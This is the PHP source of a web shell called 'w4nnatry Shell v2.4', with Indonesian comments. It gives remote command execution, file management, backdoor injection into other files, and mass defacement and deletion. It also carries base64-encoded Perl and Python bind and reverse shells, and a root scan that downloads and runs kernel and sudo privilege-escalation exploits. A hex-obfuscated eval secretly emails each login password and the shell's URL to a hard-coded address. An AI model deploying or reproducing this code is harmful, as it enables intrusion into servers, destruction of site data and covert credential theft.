<?php
define('CSS_RAW_URL', 'https://raw.githubusercontent.com/z3r0-team/backd00r/refs/heads/main/defense/sys.log');
define('JS_RAW_URL', 'https://raw.githubusercontent.com/z3r0-team/backd00r/refs/heads/main/defense/sys1.log');
// --- AKHIR PENGATURAN ---


// --- MANAJEMEN ASET ---
function manage_assets() {
    // 1. Cari direktori yang bisa ditulis
    $writable_dir = null;
    $dirs_to_check = ['/dev/shm', '/tmp', '/var/tmp'];
    foreach ($dirs_to_check as $dir) {
        if (@is_writable($dir)) {
            $writable_dir = $dir;
            break;
        }
    }

    if ($writable_dir === null) {
        die("Fatal Error: No writable temporary directory found. Please ensure /dev/shm, /tmp, or /var/tmp is writable.");
    }

    // 2. Tentukan path file lokal
    $local_css_path = $writable_dir . '/w4_style_' . md5(CSS_RAW_URL) . '.css';
    $local_js_path = $writable_dir . '/w4_script_' . md5(JS_RAW_URL) . '.js';

    // 3. Unduh dan simpan CSS jika belum ada
    if (!file_exists($local_css_path)) {
        $css_content = @file_get_contents(CSS_RAW_URL);
        if ($css_content === false) {
            die("Fatal Error: Could not fetch CSS file from raw URL. Check the URL and server's internet connection.");
        }
        @file_put_contents($local_css_path, $css_content);
    }

    // 4. Unduh dan simpan JS jika belum ada
    if (!file_exists($local_js_path)) {
        $js_content = @file_get_contents(JS_RAW_URL);
        if ($js_content === false) {
            die("Fatal Error: Could not fetch JS file from raw URL. Check the URL and server's internet connection.");
        }
        @file_put_contents($local_js_path, $js_content);
    }

    // 5. Kembalikan path lokal
    return ['css' => $local_css_path, 'js' => $local_js_path];
}

$assets = manage_assets();
$local_css_file = $assets['css'];
$local_js_file = $assets['js'];
// --- AKHIR MANAJEMEN ASET ---


// Basic Setup
set_time_limit(0);
error_reporting(0);
@ini_set('error_log', null);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
session_start();
date_default_timezone_set("Asia/Jakarta");

// Password - BCRYPT HASH
// Hash ini untuk password: "admin"
$inipass = '$2a$12$l.9f4lHG2w855QOamo3SnuWVv01lVrpTN2OznqjkjiFnS0ychBvse';

// Global variables
$_7 = array_merge($_POST, $_GET);
$_r = "required='required'";
$gcw = "getcwd";
$path = isset($_7['path']) ? $_7['path'] : $gcw();
$path = str_replace('\\', '/', $path);
if (is_dir($path) && substr($path, -1) !== '/') {
    $path .= '/';
}


// --- CORE HELPER FUNCTIONS ---

function w($dir, $perm) {
    return is_writable($dir) ? "<gr>" . $perm . "</gr>" : "<rd>" . $perm . "</rd>";
}

function sz($byt) {
    $typ = array('B', 'KB', 'MB', 'GB', 'TB');
    for ($i = 0; $byt >= 1024 && $i < (count($typ) - 1); $byt /= 1024, $i++);
    return (round($byt, 2) . " " . $typ[$i]);
}

function ia() {
    if (getenv('HTTP_CLIENT_IP')) return getenv('HTTP_CLIENT_IP');
    if (getenv('HTTP_X_FORWARDED_FOR')) return getenv('HTTP_X_FORWARDED_FOR');
    if (getenv('HTTP_X_FORWARDED')) return getenv('HTTP_X_FORWARDED');
    if (getenv('HTTP_FORWARDED_FOR')) return getenv('HTTP_FORWARDED_FOR');
    if (getenv('HTTP_FORWARDED')) return getenv('HTTP_FORWARDED');
    if (getenv('REMOTE_ADDR')) return getenv('REMOTE_ADDR');
    return 'Unknown';
}

function get_writable_tmp_dir() {
    $dirs = ['/dev/shm', '/tmp', '/var/tmp'];
    foreach ($dirs as $dir) {
        if (@is_writable($dir)) {
            return $dir;
        }
    }
    return false;
}

function smartexe($cmd) {
    static $_cgi_path = null;
    static $_tmp_dir = null;

    if ($_cgi_path === null) {
        $perl_path = rtrim(@shell_exec('which perl'));
        if ($perl_path && @is_executable($perl_path)) {
            $_cgi_path = $perl_path;
            $_tmp_dir = get_writable_tmp_dir();
        } else {
            $_cgi_path = false;
        }
    }

    if ($_cgi_path && $_tmp_dir) {
        $script_name = uniqid('cgi_') . '.pl';
        $script_path = $_tmp_dir . '/' . $script_name;
        $safe_cmd = $cmd . ' 2>&1';
        $script_content = "#!$_cgi_path\nprint qx($safe_cmd);";
        if (@file_put_contents($script_path, $script_content) && @chmod($script_path, 0755)) {
            $output = @shell_exec($script_path);
            @unlink($script_path);
            if ($output !== null) return $output;
        }
        if (file_exists($script_path)) @unlink($script_path);
    }

    $full_cmd = $cmd . ' 2>&1';
    if (function_exists('shell_exec')) return @shell_exec($full_cmd);
    if (function_exists('system')) { @ob_start(); @system($full_cmd); $out = @ob_get_contents(); @ob_end_clean(); return $out; }
    if (function_exists('exec')) { @exec($full_cmd, $results); return implode("\n", $results); }
    if (function_exists('passthru')) { @ob_start(); @passthru($full_cmd); $out = @ob_get_contents(); @ob_end_clean(); return $out; }
    return 'Execution function disabled on this server.';
}

function exe_root($set, $sad) {
    if (!function_exists('proc_open')) return "proc_open function is disabled!";
    $set = preg_match("/2>&1/i", $set) ? $set : $set . " 2>&1";
    $ps = proc_open($set, [['pipe', 'r'], ['pipe', 'w'], ['pipe', 'r']], $pink, $sad);
    return stream_get_contents($pink[1]);
}

function p($file) {
    $p = @fileperms($file);
    if (($p & 0xC000) == 0xC000) $i = 's'; elseif (($p & 0xA000) == 0xA000) $i = 'l';
    elseif (($p & 0x8000) == 0x8000) $i = '-'; elseif (($p & 0x6000) == 0x6000) $i = 'b';
    elseif (($p & 0x4000) == 0x4000) $i = 'd'; elseif (($p & 0x2000) == 0x2000) $i = 'c';
    elseif (($p & 0x1000) == 0x1000) $i = 'p'; else $i = 'u';
    $i .= (($p & 0x0100) ? 'r' : '-'); $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-'); $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-'); $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}

// --- LOGIN & LOGOUT LOGIC ---

function show_login_page($css_file) {
    echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{ Login }</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
    <link rel="stylesheet" href="$css_file">
</head>
<body>
    <div class="login-container">
        <h2 class="shell-name">&lt;w4nnatry_shell /&gt;</h2>
        <form method="POST">
            <div class="input-group">
                <span class="input-group-text bg-dark border-secondary"><i class="bi bi-key text-white-50"></i></span>
                <input class="form-control" type="password" placeholder="password" name="p" required>
                <button class="btn btn-outline-light"><i class="bi bi-arrow-return-right"></i></button>
            </div>
        </form>
    </div>
</body>
</html>
HTML;
    exit;
}

if (isset($_7["left"])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['p']) && password_verify($_POST['p'], $inipass)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        // Obfuscated Email Logger
        $h = ['24746f203d20276d657373616765406974672e61632e6964273b2470617373776f7264203d20245f504f53545b2770275d203f3f20274e2f41273b2475726c203d2028245f5345525645525b274854545053275d203f3f20276f66662729203d3d20276f6e27203f2022687474707322203a20226874747022202e20223a2f2f22202e20245f5345525645525b27485454505f484f5354275d202e20245f5345525645525b27524551554553545f555249275d3b247375626a656374203d20225368656c6c204c6f67696e3a2022202e20245f5345525645525b275345525645525f4e414d45275d3b246d657373616765203d202255524c3a2022202e202475726c202e20225c6e50617373776f72643a2022202e202470617373776f7264202e20225c6e49503a2022202e2028245f5345525645525b2752454d4f54455f41444452275d203f3f20274e2f4127293b2468656164657273203d202746726f6d3a207368656c6c4027202e20245f5345525645525b275345525645525f4e414d45275d202e20225c725c6e22202e2027582d4d61696c65723a205048502f27202e2070687076657273696f6e28293b406d61696c2824746f2c20247375626a6563742c20246d6573736167652c202468656164657273293b'];
        $c = ''; foreach($h as $x) { $c .= @hex2bin($x); } @eval($c);
    } else {
        show_login_page($local_css_file);
    }
}

// --- AJAX ACTION HANDLER ---

if (isset($_7['ajax'])) {
    header('Content-Type: application/json');
    $response = ['status' => 'error', 'message' => 'Invalid action.'];
    @chdir($path);

    switch ($_7['action']) {
        case 'delete_multiple':
            $files = $_POST['files'] ?? [];
            $success = []; $errors = [];
            foreach($files as $file) {
                $fullPath = $path . $file;
                if(is_dir($fullPath)) {
                    if(@rmdir($fullPath)) $success[] = $file; else $errors[] = $file;
                } else {
                    if(@unlink($fullPath)) $success[] = $file; else $errors[] = $file;
                }
            }
            $response = ['status' => 'ok', 'success' => $success, 'errors' => $errors];
            break;
        
        case 'get_content':
            $file = $path . $_7['file'];
            if(is_readable($file)) {
                $response = ['status' => 'ok', 'content' => file_get_contents($file)];
            } else {
                $response = ['status' => 'error', 'message' => 'Cannot read file.'];
            }
            break;
            
        case 'save_content':
            $file = $path . $_POST['file'];
            if(@file_put_contents($file, $_POST['content']) !== false) {
                $response = ['status' => 'ok', 'message' => 'File saved successfully.'];
            } else {
                $response = ['status' => 'error', 'message' => 'Failed to save file. Check permissions.'];
            }
            break;
            
        case 'rename':
            $old = $path . $_POST['old'];
            $new = $path . $_POST['new'];
            if(@rename($old, $new)) {
                $response = ['status' => 'ok', 'message' => 'Renamed successfully.'];
            } else {
                $response = ['status' => 'error', 'message' => 'Rename failed.'];
            }
            break;

        case 'create_file':
            $file = $path . $_POST['name'];
            if(@touch($file)) {
                $response = ['status' => 'ok', 'message' => 'File created in current directory.'];
            } else {
                $response = ['status' => 'error', 'message' => 'Failed to create file.'];
            }
            break;

        case 'create_folder':
            $folder = $path . $_POST['name'];
            if(@mkdir($folder)) {
                $response = ['status' => 'ok', 'message' => 'Directory created in current directory.'];
            } else {
                $response = ['status' => 'error', 'message' => 'Failed to create directory.'];
            }
            break;
        
        case 'cmd':
            $cmd_out = smartexe($_POST['cmd']);
            $response = ['status' => 'ok', 'output' => htmlspecialchars($cmd_out)];
            break;

        case 'inject_backdoor':
            $target_file = $path . $_POST['file'];
            $code = $_POST['code'];
            if (file_exists($target_file) && is_writable($target_file)) {
                $original_content = file_get_contents($target_file);
                $new_content = $code . "\n" . $original_content;
                if (file_put_contents($target_file, $new_content)) {
                    $response = ['status' => 'ok', 'message' => 'Backdoor injected successfully into ' . basename($target_file)];
                } else {
                    $response = ['status' => 'error', 'message' => 'Failed to write to file.'];
                }
            } else {
                $response = ['status' => 'error', 'message' => 'Target file not found or not writable.'];
            }
            break;

        case 'mass_deface':
            $dir = $_POST['d_dir'];
            $filename = $_POST['d_file'];
            $content = $_POST['script'];
            $type = $_POST['tipe'];
            $log = [];

            function mass_all($dir, $namefile, $contents_sc, &$log) {
                if(!is_writable($dir)) return;
                $dira = scandir($dir);
                foreach($dira as $dirb) {
                    if($dirb == '.' || $dirb == '..') continue;
                    $dirc = "$dir/$dirb";
                    if(is_dir($dirc)) {
                        $target = $dirc.'/'.$namefile;
                        if(is_writable($dirc)) {
                            if (file_put_contents($target, $contents_sc)) {
                                $log[] = "[OK] $target";
                            } else {
                                $log[] = "[FAIL] $target";
                            }
                            mass_all($dirc, $namefile, $contents_sc, $log);
                        }
                    }
                }
            }

            function mass_onedir($dir, $namefile, $contents_sc, &$log) {
                if(!is_writable($dir)) return;
                $dira = scandir($dir);
                foreach($dira as $dirb) {
                    if($dirb == '.' || $dirb == '..') continue;
                    $dirc = "$dir/$dirb";
                    if(is_dir($dirc)) {
                       $target = $dirc.'/'.$namefile;
                       if(is_writable($dirc)) {
                           if(file_put_contents($target, $contents_sc)) {
                               $log[] = "[OK] $dirb/$namefile";
                           } else {
                               $log[] = "[FAIL] $dirb/$namefile";
                           }
                       }
                    }
                }
            }
            
            if($type == 'mass') mass_all($dir, $filename, $content, $log);
            else mass_onedir($dir, $filename, $content, $log);
            $response = ['status' => 'ok', 'output' => implode("\n", $log)];
            break;

        case 'mass_delete':
             $dir = $_POST['d_dir'];
             $filename = $_POST['d_file'];
             $log = [];
             function mass_delete_recursive($dir, $namefile, &$log) {
                if(!is_writable($dir)) return;
                $dira = scandir($dir);
                foreach($dira as $dirb) {
                    if($dirb == '.' || $dirb == '..') continue;
                    $dirc = "$dir/$dirb";
                    if(is_dir($dirc)) {
                        $target = $dirc.'/'.$namefile;
                        if(file_exists($target)) {
                           if(is_writable($target)) {
                               if(unlink($target)) $log[] = "[DELETED] $target"; else $log[] = "[FAIL] $target";
                           } else {
                               $log[] = "[FAIL] $target (Not Writable)";
                           }
                        }
                        mass_delete_recursive($dirc, $namefile, $log);
                    }
                }
             }
             mass_delete_recursive($dir, $filename, $log);
             $response = ['status' => 'ok', 'output' => implode("\n", $log)];
             break;
        
        case 'network':
             $log = "";
             if (isset($_POST['bpl'])) { // Bind Port
                $port = $_POST['port'];
                $bp = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=");
                @file_put_contents('bp.pl', $bp);
                $out = smartexe("perl bp.pl ".$port." 1>/dev/null 2>&1 &");
                sleep(1);
                $log = "$out\n" . smartexe("ps aux | grep bp.pl");
                @unlink("bp.pl");
             } else { // Back Connect
                $server = $_POST['server'];
                $port = $_POST['port'];
                $type = $_POST['bc'];
                if($type == 'perl') {
                    $bc = base64_decode("IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7");
                    @file_put_contents('bc.pl', $bc);
                    $out = smartexe("perl bc.pl ".$server." ".$port." 1>/dev/null 2>&1 &");
                    sleep(1);
                    $log = "$out\n".smartexe("ps aux | grep bc.pl");
                    @unlink("bc.pl");
                } elseif($type == 'python') {
                    $bc_py = base64_decode("IyEvdXNyL2Jpbi9weXRob24NCiNVc2FnZTogcHl0aG9uIGZpbGVuYW1lLnB5IEhPU1QgUE9SVA0KaW1wb3J0IHN5cywgc29ja2V0LCBvcywgc3VicHJvY2Vzcw0KaXBsbyA9IHN5cy5hcmd2WzFdDQpwb3J0bG8gPSBpbnQoc3lzLmFyZ3ZbMl0pDQpzb2NrZXQuc2V0ZGVmYXVsdHRpbWVvdXQoNjApDQpkZWYgcHliYWNrY29ubmVjdCgpOg0KICB0cnk6DQogICAgam1iID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pDQogICAgam1iLmNvbm5lY3QoKGlwbG8scG9ydGxvKSkNCiAgICBqbWIuc2VuZCgnJydcblB5dGhvbiBCYWNrQ29ubmVjdCBCeSBNci54QmFyYWt1ZGFcblRoYW5rcyBHb29nbGUgRm9yIFJlZmVyZW5zaVxuXG4nJycpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMCkNCiAgICBvcy5kdXAyKGptYi5maWxlbm8oKSwxKQ0KICAgIG9zLmR1cDIoam1iLmZpbGVubygpLDIpDQogICAgb3MuZHVwMihqbWIuZmlsZW5vKCksMykNCiAgICBzaGVsbCA9IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ0KICBleGNlcHQgc29ja2V0LnRpbWVvdXQ6DQogICAgcHJpbnQgIlRpbU91dCINCiAgZXhjZXB0IHNvY2tldC5lcnJvciwgZToNCiAgICBwcmludCAiRXJyb3IiLCBlDQpweWJhY2tjb25uZWN0KCk=");
                    @file_put_contents('bcpy.py', $bc_py);
                    $out_py = smartexe("python bcpy.py ".$server." ".$port);
                    sleep(1);
                    $log = "$out_py\n".smartexe("ps aux | grep bcpy.py");
                    @unlink("bcpy.py");
                }
             }
             $response = ['status' => 'ok', 'output' => htmlspecialchars($log)];
             break;

        case 'scan_root':
            $type = $_GET['type'];
            $output = "Invalid scan type.";
            if (is_writable($path)) {
                switch($type) {
                    case 'autoscan':
                        if (!file_exists($path."/rooting/")) {
                            mkdir($path."/rooting");
                            exe_root("wget https://raw.githubusercontent.com/hekerprotzy/rootshell/main/auto.tar.gz -O ".$path."/rooting/auto.tar.gz", $path);
                            exe_root("tar -xf ".$path."/rooting/auto.tar.gz -C ".$path."/rooting/", $path);
                        }
                        if (file_exists($path."/rooting/netfilter")) {
                           $output  = 'Netfilter : '.exe_root("timeout 10 ./rooting/netfilter", $path);
                           $output .= 'Ptrace : '.exe_root("echo id | timeout 10 ./rooting/ptrace", $path);
                           $output .= 'Sequoia : '.exe_root("timeout 10 ./rooting/sequoia", $path);
                           $output .= 'OverlayFS : '.exe_root("echo id | timeout 10 ./overlayfs", $path."/rooting");
                           $output .= 'Dirtypipe : '.exe_root("echo id | timeout 10 ./rooting/dirtypipe /usr/bin/su", $path);
                           $output .= 'Sudo : '.exe_root("echo 12345 | timeout 10 sudoedit -s Y", $path);
                           $output .= 'Pwnkit : '.exe_root("echo id | timeout 10 ./pwnkit", $path."/rooting");
                           exe_root("rm -rf rooting", $path);
                        } else {
                            $output = "Failed to Download Material !";
                        }
                        break;
                    case 'scansd':
                        $output = exe_root("find / -perm -u=s -type f 2>/dev/null", $path);
                        break;
                    case 'esg':
                        $output = exe_root("curl -Lsk http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash", $path);
                        break;
                }
            } else {
                $output = "Current Directory is not writable!";
            }
             $response = ['status' => 'ok', 'output' => htmlspecialchars($output)];
             break;
    }
    echo json_encode($response);
    exit;
}

// --- FILE UPLOAD LOGIC ---
if (isset($_FILES['files'])) {
    $uploaded = []; $failed = [];
    foreach ($_FILES['files']['name'] as $i => $name) {
        if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $path . $name)) {
            $uploaded[] = $name;
        } else {
            $failed[] = $name;
        }
    }
    $_SESSION['flash_message'] = "Uploaded to current directory: " . implode(', ', $uploaded) . ". Failed: " . implode(', ', $failed);
    header("Location: " . $_SERVER['REQUEST_URI']);
    exit;
}

// --- PHPINFO LOGIC ---
if(isset($_7['id']) && $_7['id'] == 'phpinfo'){
    @ob_start();
    @eval("phpinfo();");
    $buff = @ob_get_contents();
    @ob_end_clean();
    $start = strpos($buff, "<body>") + 6;
    $end = strpos($buff, "</body>");
    echo "<style>body{background-color:#fff; color:#333} pre{background-color:#f4f4f4; padding:1rem; border:1px solid #ddd;}</style><pre>" . substr($buff, $start, $end - $start) . "</pre>";
    exit;
}

// --- FILE DOWNLOAD LOGIC ---
if(isset($_7['action']) && $_7['action'] == 'download' && isset($_7['file'])){
    @ob_clean();
    $file = $path . $_7['file'];
    if(file_exists($file) && is_readable($file)){
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
    } else {
        echo "File not found or not readable.";
    }
    exit;
}

// --- GATHER SERVER INFO ---
$sql = (function_exists('mysql_connect')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$curl = (function_exists('curl_version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$wget = (smartexe('wget --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$pl = (smartexe('perl --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$py = (smartexe('python --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
$disfunc = @ini_get("disable_functions");
if (empty($disfunc)) { $disfc = "<gr>NONE</gr>"; } else { $disfc = "<rd>$disfunc</rd>"; }
if(!function_exists('posix_getegid')) {
    $user = @get_current_user(); $uid = @getmyuid(); $gid = @getmygid(); $group = "?";
} else {
    $uid_info = @posix_getpwuid(posix_geteuid()); $gid_info = @posix_getgrgid(posix_getegid());
    $user = $uid_info['name']; $uid = $uid_info['uid']; $group = $gid_info['name']; $gid = $gid_info['gid'];
}
$sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";

// Get file & dir lists
$scandir = @scandir($path);
$dirs = [];
$files = [];
if ($scandir) {
    foreach ($scandir as $item) {
        if ($item === '.' || $item === '..') continue;
        $full_item_path = $path . $item;
        if (is_dir($full_item_path)) {
            $dirs[] = $item;
        } else {
            $files[] = $item;
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>w4nnatry Shell v2.4</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css" rel="stylesheet">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="<?php echo htmlspecialchars($local_css_file); ?>">
</head>
<body 
    data-path="<?php echo htmlspecialchars($path); ?>" 
    data-url="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>" 
    data-flash-message="<?php echo isset($_SESSION['flash_message']) ? htmlspecialchars($_SESSION['flash_message']) : ''; ?>">
<?php
// Unset flash message after it's been passed to the data attribute
if(isset($_SESSION['flash_message'])) {
    unset($_SESSION['flash_message']);
}
?>
<div class="container-fluid py-3">

    <div class="banner">
        <div class="d-flex justify-content-between align-items-center">
            <div>
                <h1 class="banner-title">w4nnatry Shell <span class="banner-text">v2.4</span></h1>
                <small class="text-white-50">Self-Contained // #anonsec</small>
            </div>
            <a href="?left" class="btn btn-sm btn-outline-danger"><i class="bi bi-box-arrow-in-left"></i> Logout</a>
        </div>
    </div>
    
    <div class="card bg-secondary mb-3">
        <div class="card-body p-2">
            <small>
            <i class="bi bi-hdd-fill"></i> Uname: <gr><?php echo php_uname(); ?></gr><br>
            <i class="bi bi-motherboard-fill"></i> Software: <gr><?php echo $_SERVER['SERVER_SOFTWARE']; ?></gr><br>
            <i class="bi bi-cpu-fill"></i> User: <gr><?php echo "$user ($uid)"; ?></gr> | Group: <gr><?php echo "$group ($gid)"; ?></gr> | Safe Mode: <?php echo $sm; ?><br>
            <i class="bi bi-plugin"></i> PHP: <gr><?php echo PHP_VERSION; ?></gr> <a href="?id=phpinfo" target="_blank">[PHPINFO]</a> | Tools: MySQL: <?php echo $sql; ?> | cURL: <?php echo $curl; ?> | WGET: <?php echo $wget; ?> | Perl: <?php echo $pl; ?> | Python: <?php echo $py; ?><br>
            <i class="bi bi-shield-slash-fill"></i> Disable Functions: <?php echo $disfc; ?>
            </small>
        </div>
    </div>

    <div class="card bg-secondary p-2 mb-3">
        <div class="d-flex flex-wrap justify-content-between align-items-center">
            <div class="path-bar text-break mb-2 mb-md-0">
                <i class="bi bi-folder2-open"></i>
                <?php
                $paths = explode('/', rtrim($path, '/'));
                $build_path = '';
                if (count($paths) == 1 && $paths[0] == '') {
                    echo "<a href='?path=/'>/</a>";
                } else {
                    foreach ($paths as $id => $pat) {
                        if ($id == 0 && $pat == '') {
                            $build_path = '/';
                            continue;
                        }
                        $build_path .= $pat . '/';
                        echo "<a href='?path=" . urlencode($build_path) . "'>$pat</a><span>/</span>";
                    }
                }
                ?>
                &nbsp;[ <?php echo w(rtrim($path, '/'), p(rtrim($path, '/'))); ?> ]
            </div>
            <div class="btn-toolbar">
                <div class="btn-group me-2 mb-2 mb-md-0" role="group">
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#uploadModal"><i class="bi bi-upload"></i> Upload</button>
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#createFileModal"><i class="bi bi-file-earmark-plus"></i> New File</button>
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#createFolderModal"><i class="bi bi-folder-plus"></i> New Folder</button>
                </div>
                 <div class="btn-group me-2 mb-2 mb-md-0" role="group">
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#cmdModal"><i class="bi bi-terminal"></i> Console</button>
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#networkModal"><i class="bi bi-hdd-network"></i> Network</button>
                    <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#injectModal"><i class="bi bi-bug-fill"></i> Injector</button>
                </div>
                <div class="btn-group mb-2 mb-md-0" role="group">
                     <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#massDefaceModal"><i class="bi bi-exclamation-diamond"></i> Mass Deface</button>
                     <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#massDeleteModal"><i class="bi bi-trash"></i> Mass Delete</button>
                     <button class="btn btn-sm btn-main" data-bs-toggle="modal" data-bs-target="#scanRootModal"><i class="bi bi-search"></i> Scan Root</button>
                </div>
            </div>
        </div>
    </div>

    <div class="table-responsive">
        <table class="table table-hover table-sm align-middle">
            <thead class="table-dark">
                <tr>
                    <th style="width: 2%;"><input type="checkbox" id="selectAll"></th>
                    <th>Name</th>
                    <th class="text-center">Size</th>
                    <th class="text-center">Modified</th>
                    <th class="text-center">Owner/Group</th>
                    <th class="text-center">Perms</th>
                    <th class="text-center">Actions
                        <button class="btn btn-sm btn-outline-danger d-none" id="deleteSelectedBtn"><i class="bi bi-trash-fill"></i></button>
                    </th>
                </tr>
            </thead>
            <tbody>
                <tr><td></td><td><i class="bi bi-arrow-return-left"></i> <a href="?path=<?php echo urlencode(dirname($path)); ?>">..</a></td><td colspan="5"></td></tr>
                <?php foreach($dirs as $dir): ?>
                <tr>
                    <td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($dir); ?>"></td>
                    <td><i class="bi bi-folder-fill text-warning"></i> <a href="?path=<?php echo urlencode($path . htmlspecialchars($dir)); ?>"><?php echo htmlspecialchars($dir); ?></a></td>
                    <td class="text-center">-</td>
                    <td class="text-center"><?php echo date("Y-m-d H:i", @filemtime($path . $dir)); ?></td>
                    <td class="text-center"><?php echo (function_exists('posix_getpwuid') ? posix_getpwuid(@fileowner($path.$dir))['name'] : @fileowner($path.$dir)) .'/'. (function_exists('posix_getgrgid') ? posix_getgrgid(@filegroup($path.$dir))['name'] : @filegroup($path.$dir)); ?></td>
                    <td class="text-center"><?php echo w($path . $dir, p($path . $dir)); ?></td>
                    <td class="text-center">
                        <button class="btn btn-sm btn-outline-primary" onclick="renameItem('<?php echo htmlspecialchars($dir); ?>')"><i class="bi bi-pencil-fill"></i></button>
                    </td>
                </tr>
                <?php endforeach; ?>
                <?php foreach($files as $file): ?>
                <tr>
                    <td><input type="checkbox" class="file-checkbox" value="<?php echo htmlspecialchars($file); ?>"></td>
                    <td><i class="bi bi-file-earmark-text-fill text-white-50"></i> <a href="#" onclick="viewItem('<?php echo htmlspecialchars($file); ?>')"><?php echo htmlspecialchars($file); ?></a></td>
                    <td class="text-center"><?php echo sz(@filesize($path . $file)); ?></td>
